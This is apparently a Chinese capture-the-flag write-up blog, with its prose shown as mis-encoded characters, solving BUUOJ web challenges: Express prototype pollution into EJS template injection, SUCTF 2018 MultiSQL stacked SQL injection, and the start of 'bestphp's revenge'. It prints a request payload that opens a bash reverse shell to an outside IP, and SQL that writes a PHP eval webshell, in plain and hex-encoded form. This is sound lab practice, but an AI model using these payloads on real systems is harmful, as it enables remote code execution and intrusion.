class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="property">constructor</span> &amp;&amp; obj.<span class="property">constructor</span> === <span class="title class_">Object</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">isObject</span>(a[attr]) &amp;&amp; <span class="title function_">isObject</span>(b[attr])) &#123;</span><br><span class="line">      <span class="title function_">merge</span>(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">a</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">safeKeyword</span>(<span class="params">keyword</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(keyword.<span class="title function_">match</span>(<span class="regexp">/(admin)/i</span>s)) &#123;</span><br><span class="line">    <span class="keyword">return</span> keyword</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">user</span>)&#123;</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="property">outputFunctionName</span>=<span class="literal">undefined</span>;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">Submit</span>==<span class="string">&quot;register&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_">safeKeyword</span>(req.<span class="property">body</span>.<span class="property">userid</span>))&#123;</span><br><span class="line">      res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) </span><br><span class="line">    &#125;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">user</span>=&#123;</span><br><span class="line">      <span class="string">&#x27;user&#x27;</span>:req.<span class="property">body</span>.<span class="property">userid</span>.<span class="title function_">toUpperCase</span>(),</span><br><span class="line">      <span class="string">&#x27;passwd&#x27;</span>: req.<span class="property">body</span>.<span class="property">pwd</span>,</span><br><span class="line">      <span class="string">&#x27;isLogin&#x27;</span>:<span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">Submit</span>==<span class="string">&quot;login&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">user</span>)&#123;res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125;</span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>==req.<span class="property">body</span>.<span class="property">userid</span>&amp;&amp;req.<span class="property">body</span>.<span class="property">pwd</span>==req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">passwd</span>)&#123;</span><br><span class="line">      req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">isLogin</span>=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>); ;</span><br><span class="line">&#125;);</span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/action&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>!=<span class="string">&quot;ADMIN&quot;</span>)&#123;res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; </span><br><span class="line">  req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">data</span> = <span class="title function_">clone</span>(req.<span class="property">body</span>);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  </span><br><span class="line">&#125;);</span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/info&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:res.<span class="property">outputFunctionName</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ°äº†æˆ‘ä»¬çš„è€æœ‹å‹ merge() å‘¢å°±è‚¯å®šå­˜åœ¨åŸå‹é“¾æ±¡æŸ“</p>
<p>é¡ºç€çœ‹é€»è¾‘ é¦–å…ˆæ˜¯ç™»é™†</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">Submit</span>==<span class="string">&quot;register&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_">safeKeyword</span>(req.<span class="property">body</span>.<span class="property">userid</span>))&#123;</span><br><span class="line">      res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) </span><br><span class="line">    &#125;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">user</span>=&#123;</span><br><span class="line">      <span class="string">&#x27;user&#x27;</span>:req.<span class="property">body</span>.<span class="property">userid</span>.<span class="title function_">toUpperCase</span>(),</span><br><span class="line">      <span class="string">&#x27;passwd&#x27;</span>: req.<span class="property">body</span>.<span class="property">pwd</span>,</span><br><span class="line">      <span class="string">&#x27;isLogin&#x27;</span>:<span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">Submit</span>==<span class="string">&quot;login&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">user</span>)&#123;res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125;</span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>==req.<span class="property">body</span>.<span class="property">userid</span>&amp;&amp;req.<span class="property">body</span>.<span class="property">pwd</span>==req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">passwd</span>)&#123;</span><br><span class="line">      req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">isLogin</span>=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>); ;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><code>&#39;user&#39;:req.body.userid.toUpperCase()</code>è¿™é‡Œå­˜åœ¨ä¸€ä¸ªæŠŠæˆ‘ä»¬åå­—è½¬ä¸ºå¤§å†™çš„æ“ä½œ</p>
<p>å…¶å®è€ƒäº†javascriptå¤§å°å†™ç‰¹æ€§</p>
<p>åœ¨jsä¸­ æœ‰ä¸€ç§ç±»å­—ç¬¦ æ¯”å¦‚<code>admÄ±n</code>çœ‹èµ·æ¥åƒæˆ‘ä»¬å¹³å¸¸çš„admin ä½†æ˜¯ä»–çš„<code>Ä±</code>å­—ç¬¦å¹¶ä¸æ˜¯æˆ‘ä»¬å¸¸ç”¨çš„i ä½†æ˜¯ç»è¿‡è¿™ä¸ªtoUpperCase()å‡½æ•°ä¹‹å å°±ä¼šå˜ä¸ºå¤§å†™çš„<code>I</code> é‚£ä¹ˆå°±å¯ä»¥bypassäº† å½“ç„¶ä¹Ÿä¼šå­˜åœ¨è½¬å°å†™çš„æ“ä½œ éƒ½æ˜¯ä¸€ä¸ªæ€è·¯</p>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p>
<p>æ³¨å†Œ<code>admÄ±n</code> ç„¶åç™»å½•å°±ç”¨<code>ADMIN</code> æˆåŠŸç™»å½•</p>
<p>ç„¶ååˆ°äº†<code>/action</code>è·¯ç”±</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/action&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>!=<span class="string">&quot;ADMIN&quot;</span>)&#123;res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; </span><br><span class="line">  req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">data</span> = <span class="title function_">clone</span>(req.<span class="property">body</span>);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p> <code>req.session.user.data = clone(req.body);</code>è¿™ä¸€æ¡è¯­å¥ç”¨åˆ°äº†æˆ‘ä»¬çš„åŸå‹é“¾æ±¡æŸ“</p>
<p>é‚£ä¹ˆåº”è¯¥æ±¡æŸ“è°å‘¢ æš‚ä¸”æ”¾ç€</p>
<p>å†æ¥çœ‹<code>/info</code>è·¯ç”±</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/info&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:res.<span class="property">outputFunctionName</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure>

<p>åˆæ˜¯è€æœ‹å‹render çœ‹åˆ°ä»–å°±æƒ³åˆ°ssti </p>
<p>å¯ä»¥çœ‹åˆ°å¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶<code>utputFunctionName</code>è¿™ä¸ªå‚æ•°æˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œsstiäº†</p>
<p>è·Ÿè¸ªä¸€ä¸‹ ç«Ÿç„¶å‘ç°è¿™ä¸ªå˜é‡æ²¡æœ‰å®šä¹‰</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689748463034-f5b3908d-9721-433c-aabf-caf52a779bc9.png" alt="img"></p>
<p>è¿™å°±å¾ˆè¯¡å¼‚äº† æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨<code>/action</code>è·¯ç”±ä¸‹å¯¹ä»–è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“  ç„¶ååœ¨<code>/info </code>å¯¹ä»–è¿›è¡Œssti è¿™æ ·å°±èƒ½getshelläº†</p>
<p>è¯·æ±‚åŒ…paylaod:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> /action <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: a041d509-23fe-47c0-8d98-0f5b4ac46eaf.<span class="property">node4</span>.<span class="property">buuoj</span>.<span class="property">cn</span>:<span class="number">81</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">178</span></span><br><span class="line"><span class="title class_">Cache</span>-<span class="title class_">Control</span>: max-age=<span class="number">0</span></span><br><span class="line"><span class="title class_">Upgrade</span>-<span class="title class_">Insecure</span>-<span class="title class_">Requests</span>: <span class="number">1</span></span><br><span class="line"><span class="title class_">Origin</span>: <span class="attr">http</span>:<span class="comment">//a041d509-23fe-47c0-8d98-0f5b4ac46eaf.node4.buuoj.cn:81</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: application/json</span><br><span class="line"><span class="title class_">User</span>-<span class="title class_">Agent</span>: <span class="title class_">Mozilla</span>/<span class="number">5.0</span> (<span class="title class_">Windows</span> <span class="variable constant_">NT</span> <span class="number">10.0</span>; <span class="title class_">Win64</span>; x64) <span class="title class_">AppleWebKit</span>/<span class="number">537.36</span> (<span class="variable constant_">KHTML</span>, like <span class="title class_">Gecko</span>) <span class="title class_">Chrome</span>/<span class="number">114.0</span><span class="number">.0</span><span class="number">.0</span> <span class="title class_">Safari</span>/<span class="number">537.36</span></span><br><span class="line"><span class="title class_">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Referer: http://a041d509-23fe-47c0-8d98-0f5b4ac46eaf.node4.buuoj.cn:81/</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Cookie: __gads=ID=2a013f3dde9ad985-2254f58cafe700cf:T=1689741221:RT=1689742200:S=ALNI_Maqp-fX6ej98tcXJHWIvb4mWhQdSg; __gpi=UID=00000c2221d9f3e8:T=1689741221:RT=1689742200:S=ALNI_MZMzVabCNghJHJfa6k9qDxOuQgInA; session=s%3A3n0kVmpVgibTGbZVYa8G39JKQSWntKeb.vA90xq%2FPvNzD14nbbu%2BW1WAfLwNX6o9st2OOFs%2Bgyqc</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;&quot;Submit&quot;:&quot;&quot;,&quot;lua&quot;:&quot;&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/8.130.34.53/7777 0&gt;&amp;1\&quot;&#x27;)&quot;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè¦æ³¨æ„å°±æ˜¯æˆ‘ä»¬æäº¤çš„payloadå½¢å¼ä¸€å®šè¦æ˜¯jsonæ ¼å¼çš„  <code>Content-Type: application/json</code></p>
<p>ç„¶åæˆ‘è¿™é‡Œæ˜¯ç”¨åå¼¹shell</p>
<p>è®¿é—®<code>/info </code>  æˆåŠŸ</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689748624364-dcb3a261-6eda-4b4c-b527-ca68431e5347.png" alt="img"></p>
<h1 id="120ã€-SUCTF-2018-MultiSQL"><a href="#120ã€-SUCTF-2018-MultiSQL" class="headerlink" title="120ã€[SUCTF 2018]MultiSQL"></a>120ã€[SUCTF 2018]MultiSQL</h1><p>è€ƒç‚¹ï¼šmysqlé¢„ç¼–è¯‘ å¤ä¹ ä¸€ä¸‹æ—§çŸ¥è¯† éƒ½å¥½ä¹…äº† å¿˜äº†</p>
<p>çœ‹æ ‡é¢˜å°±æ˜¯sqlæ³¨å…¥</p>
<p>é¦–å…ˆåœ¨æ³¨å†Œçš„æ—¶å€™å°±å¤šåŠ ä¸ª<code>&#39;</code> çœ‹çœ‹ä¼šæ€æ · ä¸€èˆ¬è¿™é‡Œå¯èƒ½ä¼šå­˜åœ¨äºŒæ¬¡æ³¨å…¥ä¹‹ç±»çš„</p>
<p>å‘ç°è¢«è½¬ä¹‰äº† ä½œç½¢</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689838045915-1e652331-c3d3-49a1-8689-efe900b70c8f.png" alt="img"></p>
<p>ç‚¹ç”¨æˆ·ä¿¡æ¯å‘ç°urlä¸å¯¹åŠ²</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689838230226-da7aa30a-ee41-4f54-b33b-ad23d0c2f0f4.png" alt="img"></p>
<p>æ„Ÿè§‰è¿™é‡Œå­˜åœ¨sqlæ³¨å…¥</p>
<p>fuzz å‘ç°è¿‡æ»¤äº†<code>unionï¼Œselect ï¼Œ&amp;ï¼Œ|</code> é‚£ä¹ˆæˆ‘ä»¬ä¸€èˆ¬çš„selectæŸ¥è¯¢å°±ä¸è¦æƒ³äº†</p>
<p>ç„¶åè¿™é“é¢˜ç›®å…¶å®è€ƒå¯Ÿçš„æ˜¯å †å æ³¨å…¥</p>
<p>ç„¶åæ­é…é¢„ç¼–è¯‘å†™ğŸ</p>
<p>æœ‰ä¸¤ç§æ–¹å¼ ä¸€ç§æ˜¯ç”¨char()å†™ğŸ å¦ä¸€ç§æ˜¯16è¿›åˆ¶æ­é…hex()å‡½æ•°å†™ğŸ</p>
<p>åœ¨åšè¿™é“é¢˜ç›®ä¹‹å‰è¿˜ä»æ¥æ²¡åœ¨sqlæ³¨å…¥çš„æ—¶å€™å†™è¿‡ğŸ å±äºæ˜¯ç¬¬ä¸€æ¬¡è§äº†</p>
<p>é¦–å…ˆæ˜¯é¢„ç¼–è¯‘ åœ¨å¾ˆæ—©ä»¥å‰ åšbuué¢˜ç›®çš„æ—¶å€™å°±è§è¿‡é¢„ç¼–è¯‘</p>
<p>é¦–å…ˆæ˜¯<code>set @A=sqlè¯­å¥;prepare B from @A;execute B;</code>æ ¼å¼å°±æ˜¯å¦‚æ­¤</p>
<p>è¿™é‡Œçš„sqlè¯­å¥å°±æ˜¯æˆ‘ä»¬è¦åœ¨mysqlä¸­å†™ä¸€å¥è¯æœ¨é©¬çš„è¯­å¥ å¦‚ä¸‹æ ¼å¼</p>
<p>å…¶å®æˆ‘æœ€æ‡µé€¼çš„å°±æ˜¯è¿™ä¸ªè·¯å¾„ä¸ºä»€ä¹ˆè¦åœ¨<code>/favicon</code>ä¸‹ å¾ˆå¥‡æ€ª ä¸ºä»€ä¹ˆ ç›´æ¥åœ¨<code>/var/www/html</code>å°±ä¸è¡Œ çœ‹äº†å¾ˆå¤šwp å°±æ˜¯æ²¡æåŠè¿™ä¸€ç‚¹  ä¹‹ååœ¨ç¥ã®çš„wpä¸­ å‘ç°æ˜¯é¢˜ç›®å¯ä»¥æ‰«åˆ°ä¸€ä¸ªè¿™ä¸ªç›®å½• çœŸå¤¸å¼  å¾¡å‰‘çš„å­—å…¸æ²¡è¿™ä¸ªç›®å½• å¦‚æœçœŸåœ¨æ¯”èµ›ä¸­åš æˆ‘ç™¾åˆ†ä¹‹ç™¾åšä¸å‡ºæ¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php eval($_POST[cmd]);?&gt;&#x27; into outfile &#x27;/var/www/html/favicon/shell.php&#x27;;</span><br></pre></td></tr></table></figure>

<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689840034510-98325feb-b607-4124-bebc-3c2155883f5d.png" alt="img"></p>
<h2 id="ç¬¬ä¸€ç§char-å†™ğŸ"><a href="#ç¬¬ä¸€ç§char-å†™ğŸ" class="headerlink" title="ç¬¬ä¸€ç§char()å†™ğŸ"></a>ç¬¬ä¸€ç§char()å†™ğŸ</h2><p>åŸç†ï¼š</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689841296825-af77f53d-2cd9-4628-bce9-ce1423b66c83.png" alt="img"></p>
<p>å°±æ˜¯åˆ©ç”¨charå‡½æ•° bypass å¯¹selectç­‰å­—ç¬¦çš„é™åˆ¶</p>
<p>éšä¾¿å†™ä¸ªè„šæœ¬ è·‘ä¸€ä¸‹å°±è¡Œäº†</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689841351215-aff04d5a-2019-4055-8abc-c8cf413c22c4.png" alt="img"></p>
<p>payload:</p>
<p><code>select &#39;&lt;?php eval($_POST[x]);?&gt;&#39; into outfile &#39;/var/www/html/favicon/1.php&#39;;</code> è½¬æˆå¯¹åº”çš„asciiç¼–ç çš„å­—ç¬¦ ç„¶åæ­é…é¢„ç¼–è¯‘æ‰“å…¥å³å¯</p>
<h2 id="ç¬¬äºŒç§-hex-æ­é…åå…­è¿›åˆ¶å†™ğŸ"><a href="#ç¬¬äºŒç§-hex-æ­é…åå…­è¿›åˆ¶å†™ğŸ" class="headerlink" title="ç¬¬äºŒç§ hex()æ­é…åå…­è¿›åˆ¶å†™ğŸ"></a>ç¬¬äºŒç§ hex()æ­é…åå…­è¿›åˆ¶å†™ğŸ</h2><p>payloadå’Œä¸Šé¢ä¸€æ ·åªä¸è¿‡ è¿™é‡Œè½¬ä¸º16è¿›åˆ¶å°±è¡Œäº†</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689841581083-5f4b6cae-f94e-4b3f-b789-3d2336b40959.png" alt="img"></p>
<p>åŸç†ï¼š</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689841713358-d2c8e3ff-c663-4305-85dc-74b7785188e7.png" alt="img"></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php eval($_POST[x]);?&gt;&#x27; into outfile &#x27;/var/www/html/favicon/1.php&#x27;;</span><br><span class="line">set @A=0x73656C65637420273C3F706870206576616C28245F504F53545B636D645D293B3F3E2720696E746F206F757466696C6520272F7661722F7777772F68746D6C2F66617669636F6E2F7368656C6C2E706870273B;prepare B from @A;execute B;</span><br></pre></td></tr></table></figure>



<h1 id="121ã€bestphpâ€™s-revenge"><a href="#121ã€bestphpâ€™s-revenge" class="headerlink" title="121ã€bestphpâ€™s revenge"></a>121ã€bestphpâ€™s revenge</h1><p>å•Šå•Šå•Šå•Š  åˆæ˜¯ä¿¡æ¯çˆ†ç‚¸çš„ä¸€é¢˜ çœŸæ˜¯ä¸€é¢˜æ¯”ä¸€é¢˜ç‚¸è£‚ ä¸€å¤©åšä¸€é¢˜å¼„æ˜ç™½è„‘å­å°±å·²ç»ç‚¸äº†</p>
<p>ä¸€å…±æœ‰ä¸¤ä¸ªæ–‡ä»¶</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;implode&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>], <span class="variable">$_POST</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="title function_ invoke__">reset</span>(<span class="variable">$_SESSION</span>), <span class="string">&#x27;welcome_to_the_lctf2018&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$b</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>flag.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">only localhost can get flag!<span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;only localhost can get flag!&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">       <span class="variable">$_SESSION</span>[<span class="string">&#x27;flag&#x27;</span>] = <span class="variable">$flag</span>;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure>

<p>çœ‹flag.php æˆ‘ä»¬éœ€è¦æœ¬åœ°è®¿é—®æ‰èƒ½æ‹¿åˆ°flag </p>
